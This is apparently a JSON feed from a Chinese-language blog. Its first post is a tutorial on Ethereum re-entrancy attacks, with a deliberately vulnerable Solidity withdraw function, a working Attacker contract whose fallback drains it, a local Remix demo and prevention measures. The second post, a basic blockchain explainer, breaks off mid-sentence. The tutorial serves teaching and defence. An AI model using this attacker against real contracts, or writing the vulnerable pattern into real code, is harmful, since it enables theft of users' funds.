{
    "version": "https://jsonfeed.org/version/1",
    "title": "冷风喧嚣",
    "subtitle": "懒狗一只",
    "icon": "https://coldwinds5167.github.io/images/favicon.ico",
    "description": null,
    "home_page_url": "https://coldwinds5167.github.io",
    "items": [
        {
            "id": "https://coldwinds5167.github.io/2021/12/11/Re-Entrancy/",
            "url": "https://coldwinds5167.github.io/2021/12/11/Re-Entrancy/",
            "title": "重入攻击",
            "date_published": "2021-12-11T11:56:34.000Z",
            "content_html": "<h1 id=\"重入攻击re-entrancy\"><a class=\"anchor\" href=\"#重入攻击re-entrancy\">#</a> 重入攻击（Re-Entrancy）</h1>\n<h2 id=\"前置\"><a class=\"anchor\" href=\"#前置\">#</a> 前置</h2>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<blockquote>\n<p>​\t\t以太坊智能合约能够调用其他外部合约的代码。而这些合约通常也处理以太币，在调用外部合约时，会要求合约提交外部调用，这些外部调用就可以被攻击者劫持。</p>\n</blockquote>\n<blockquote>\n<p>​\t\t可以通过 fallback 回退函数使合约执行更多的代码，包括回调原合约本身。因此重入攻击有点像间接调用递归函数。</p>\n</blockquote>\n<blockquote>\n<p>​\t\t攻击合约可以回调合约上的一个函数，重新进入合约上的任意位置的代码并执行，如果没有防御措施，合约中的函数可能会被多次执行。</p>\n</blockquote>\n<h3 id=\"大致操作\"><a class=\"anchor\" href=\"#大致操作\">#</a> 大致操作</h3>\n<blockquote>\n<p>​\t\t攻击者在外部地址部署攻击合约，并在该合约写入包含 fallback 回退函数的恶意代码，当合约把以太币发送到该地址时，恶意代码会被激活，这些代码会在没有保护的合约上执行函数。</p>\n</blockquote>\n<h3 id=\"fallback回退函数\"><a class=\"anchor\" href=\"#fallback回退函数\">#</a> Fallback 回退函数</h3>\n<h4 id=\"fallback函数的定义\"><a class=\"anchor\" href=\"#fallback函数的定义\">#</a> fallback 函数的定义</h4>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 无函数名、无函数参数、无返回值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 当要调用的函数找不到时就会触发对 fallback 函数的自动调用。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 由于 Solidity 中提供了编译期检查，所以不能直接通过 Solidity 调用一个不存在的函数。但可以使用 Solidity 的提供的底层函数 address.call 来模拟这一行为。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">FallbackCalled</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"fallback函数的使用\"><a class=\"anchor\" href=\"#fallback函数的使用\">#</a> fallback 函数的使用</h4>\n<blockquote>\n<p>​\t\t使用 send () 函数向某个合约直接转账时，这个行为没有发送任何数据，所以接收合约<strong>总是</strong>会调用 fallback () 函数。</p>\n<p>​\t\t如果要在合约中通过 send () 函数接收以太币，就必须定义 fallback 函数（否则异常），且 fallback 函数必须添加关键字 payable（否则结果将为 false）。</p>\n<p>​\t\t发送以太币一方的合约中的 send () 函数可以不用定义 fallback 函数。</p>\n</blockquote>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h3>\n<p>​\t\t构造一个漏洞合约，用于存放一定数量的以太币。</p>\n<p>​\t\t同时构造一个攻击合约，用于窃取漏洞合约的以太币。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 声明 solidity 版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.23</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 漏洞合约</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">theDAO</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> _credit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">event</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">event</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 存款函数，攻击合约攻击时会先存入一定金额</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        _credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 取款函数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//_credit 为账户在该合约的存款</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//amount 是单次取款的金额</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 关键漏洞函数</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            _credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">// 查询函数，查看账户在该合约中的存款</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">creditOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> _credit<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">// 查询函数，查看该合约中的余额</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">checkBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">// 攻击合约</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attacker</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    theDAO <span class=\"token keyword\">public</span> _newDAO<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> times <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">Attacker</span><span class=\"token punctuation\">(</span>theDAO addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        _owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        _newDAO <span class=\"token operator\">=</span> addr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    \t<span class=\"token comment\">// 向漏洞合约存钱</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token comment\">// 从漏洞合约取钱</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">checkBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">// 记录函数，记录 fallback 函数执行次数</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">times</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">return</span> times<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">//fallback 回退函数</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    \ttimes <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"合约编译-部署与执行\"><a class=\"anchor\" href=\"#合约编译-部署与执行\">#</a> 合约编译、部署与执行</h3>\n<blockquote>\n<p>​\t\t合约的编译和部署在在线编译网站<span class=\"exturl\" data-url=\"aHR0cDovL3JlbWl4LmV0aGVyZXVtLm9yZw==\"> http://remix.ethereum.org</span> 上进行，也可以选择本地编译器 solc 进行。</p>\n</blockquote>\n<h4 id=\"编译合约\"><a class=\"anchor\" href=\"#编译合约\">#</a> 编译合约</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/image-20210424121204202.png\" alt=\"\" /></p>\n<blockquote>\n<p>注意编译版本尽量与声明版本号一致。</p>\n</blockquote>\n<h4 id=\"部署合约\"><a class=\"anchor\" href=\"#部署合约\">#</a> 部署合约</h4>\n<p>​\t\t本次演示合约将部署在本地环境<strong> JavaScript VM</strong> 上。</p>\n<p>​\t\t首先部署漏洞合约 theDAO，部署完成后向合约转入一定金额。</p>\n<p>​\t\t接着部署<strong>攻击合约</strong>，在部署时输入<strong>漏洞合约</strong>的地址，并在部署时转入一定金额。</p>\n<blockquote>\n<p>​\t\t这里转账顺序与合约源码有关，有三种接受转账方式（部署转账、合约转账、直接转账），在编译前根据需求（安全性、便利性）灵活使用。</p>\n</blockquote>\n<h4 id=\"执行攻击\"><a class=\"anchor\" href=\"#执行攻击\">#</a> 执行攻击</h4>\n<pre><code>\t1. 先分别点击**漏洞合约**的checkBalance选项和**攻击合约**的checkBalance选项，确认攻击前两个合约内的金额数量。\n\t2. 点击攻击合约的attack选项，对**漏洞合约**进行攻击。\n\t3. 待攻击完成后，分别点击**漏洞合约**的checkBalance选项和**攻击合约**的checkBalance选项，确认攻击后两个合约内的金额数量。\n\t4. 点击**攻击合约**的times选项，以**攻击合约**执行一次fallback回退函数为指标，查看攻击次数。\n</code></pre>\n<h4 id=\"过程分析\"><a class=\"anchor\" href=\"#过程分析\">#</a> 过程分析</h4>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>攻击合约执行_newDAO<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  向漏洞合约转账<span class=\"token number\">10</span>wei，这时漏洞合约会记录攻击合约的存款为<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  其中sender是攻击合约地址，value是我们转入的金额。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">2.</span>攻击合约接着执行_newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  意图从漏洞合约中取出<span class=\"token number\">10</span>wei。这时漏洞合约会比较我们希望取出的金额和存款   的金额，因为我们是存<span class=\"token number\">10</span>取<span class=\"token number\">10</span>，所以成功通过比较。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">3.</span>这时会执行漏洞合约中的msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  使漏洞合约向攻击合约转账<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">4.</span>攻击合约接收到<span class=\"token number\">10</span>wei后执行fallback回退函数，从而执行_newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  继续从漏洞合约中取出<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">5.</span>因为在上一次取款中，漏洞合约执行msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   后因为回退函数跳转回withdraw的开头，并没有执行_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span>   <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span>导致攻击合约在漏洞合约中的余额还是<span class=\"token number\">10</span>wei（尽管我们已经取走   了<span class=\"token number\">10</span>wei），因此漏洞合约继续向攻击合约转账<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">6.</span>攻击合约会不断重复步骤<span class=\"token number\">4</span>和<span class=\"token number\">5</span>，直到gas达到该次交易的上限或者漏洞合约中的   余额用尽。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">7.</span>这时才会继续往下执行_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span>让攻击合约在漏洞   合约中的存款变为<span class=\"token number\">0</span>，然后结束合约的执行。</pre></td></tr></table></figure><h4 id=\"运行结果\"><a class=\"anchor\" href=\"#运行结果\">#</a> 运行结果</h4>\n<p>​\t\t攻击合约通过重入攻击，窃取了漏洞合约中大量以太币。</p>\n<h2 id=\"预防措施\"><a class=\"anchor\" href=\"#预防措施\">#</a> 预防措施</h2>\n<ol>\n<li>\n<p>在合约中，遇到向外部合约转账的情况时，使用 solidity 中内置的 transfer () 函数，而不是 call () 函数。</p>\n<p>transfer () 函数仅会发送 2300 Gas 给用于合约的外部调用，这不足以攻击合约反复重入原合约。</p>\n</li>\n<li>\n<p>确保所有改变状态变量的逻辑，都发生在以太币被发送出合约（或任何外部调用）之前。</p>\n<p>上面的合约之所以能被重入攻击，很大一部分原因在于漏洞合约在转账时是先转账，再对用户的余额数进行修改，这使得合约在被重入攻击时，用户的余额数一致不变。如果是先修改余额再转账，攻击合约在第一次重入取款函数时，就会因为余额不足而失败。</p>\n</li>\n<li>\n<p>引入互斥锁，添加一个状态变量，在合约代码执行期间锁定合约，使得代码执行完之前只能有一个线程执行函数，防止函数被重入调用。</p>\n</li>\n</ol>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://coldwinds5167.github.io/2021/12/11/Blockchain-profiles/",
            "url": "https://coldwinds5167.github.io/2021/12/11/Blockchain-profiles/",
            "title": "区块链简介",
            "date_published": "2021-12-11T11:47:26.000Z",
            "content_html": "<h1 id=\"区块链简介\"><a class=\"anchor\" href=\"#区块链简介\">#</a> 区块链简介</h1>\n<h2 id=\"概念定义\"><a class=\"anchor\" href=\"#概念定义\">#</a> 概念定义</h2>\n<blockquote>\n<p>​\t\t区块链是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODglODYlRTUlQjglODMlRTUlQkMlOEYvMTkyNzYyMzI=\">分布式</span>数据存储、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODIlQjklRTUlQUYlQjklRTclODIlQjklRTQlQkMlQTAlRTglQkUlOTMvODQ5MTk1Ng==\">点对点传输</span>、共识机制、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEElQTAlRTUlQUYlODYlRTclQUUlOTclRTYlQjMlOTUvMjgxNjIxMw==\">加密算法</span>等计算机技术的新型应用模式。区块链（Blockchain），是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQUYlOTQlRTclODklQjklRTUlQjglODEvNDE0MzY5MA==\">比特币</span>的一个重要概念，它本质上是一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEUlQkIlRTQlQjglQUQlRTUlQkYlODMlRTUlOEMlOTYvODcxOTUzMg==\">去中心化</span>的数据库，同时作为<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQUYlOTQlRTclODklQjklRTUlQjglODEvNDE0MzY5MA==\">比特币</span>的底层技术，是一串使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODYlRTclQTAlODElRTUlQUQlQTYvNDgwMDAx\">密码学</span>方法相关联产生的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTYlOEQlQUUlRTUlOUQlOTcvMTA3Njcy\">数据块</span>，每一个数据块中包含了一批次比特币网络交易的信息，用于验证其信息的有效性（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOTglQjIlRTQlQkMlQUEvOTYzODU1MA==\">防伪</span>）和生成下一个区块。其具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点。</p>\n</blockquote>\n<h2 id=\"特点\"><a class=\"anchor\" href=\"#特点\">#</a> 特点</h2>\n<h3 id=\"去中心化\"><a class=\"anchor\" href=\"#去中心化\">#</a> 去中心化</h3>\n<p>​\t\t在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为暂时的中心，实现点对点的直接连接。</p>\n<h3 id=\"不可篡改全程留痕可以追溯\"><a class=\"anchor\" href=\"#不可篡改全程留痕可以追溯\">#</a> 不可篡改 / 全程留痕 / 可以追溯</h3>\n<p>​\t\t在区块链中，每一个数据块都通过密码学算法计算和记录一段时间系统内全部信息交流的数据，并依据这些数据生成该数据块的指纹用于连接或生成下一个数据块并检验其信息的有效性。</p>\n<p>​\t\t如果修改一个区块的数据，这个区块便不被其他区块承认，而又因为其<strong>去中心化</strong>的特点，使得大规模修改区块数据十分困难，达到了<strong>不可篡改</strong>的效果。</p>\n<p>​\t\t区块链上每一个新区块的生成都包含了旧区块的信息，使得区块链储存了系统全部的历史数据，达到了<strong>全程留痕</strong>的效果。</p>\n<p>​\t\t区块链中的所有节点在每一个区块上都有一个时间戳，表示这个信息是这个时间写入的。又因其<strong>不可篡改</strong>的特点，使得区块链上每一条数据都可以通过链式结构追本溯源，验证其存在性，达到了<strong>可以追溯</strong>的特点。</p>\n<h3 id=\"集体维护\"><a class=\"anchor\" href=\"#集体维护\">#</a> 集体维护</h3>\n<p>​\t\t因为<strong>去中心化</strong>，区块链中的数据块由系统中所有具有维护功能的节点来共同维护，同时这些节点是开源的，任何人都可以参与。并且每一个节点在参与记录的同时也来验证其他节点记录结果的正确性，维护效率提高，成本降低。</p>\n<h3 id=\"公开透明隐私保护\"><a class=\"anchor\" href=\"#公开透明隐私保护\">#</a> 公开透明 / 隐私保护</h3>\n<p>​\t\t区块链中储存了系统全部的历史信息交流数据，并且<strong>可以追溯</strong>，使得区块链中的数据<strong>公开透明</strong>。</p>\n<p>​\t\t存储在区块链上的交易信息是公开的，但是账户身份信息是高度加密的。为了保护区块链中用户的隐私，BTC 通过隔断交易地址和地址持有人真实身份的关联（利用公钥哈希值作为交易标识），来达到匿名的效果，即知道有这笔交易，但不知道由谁交易给谁。但通过观察和跟踪区块链的信息，分析重复使用公钥哈希值和多次重复的 IP 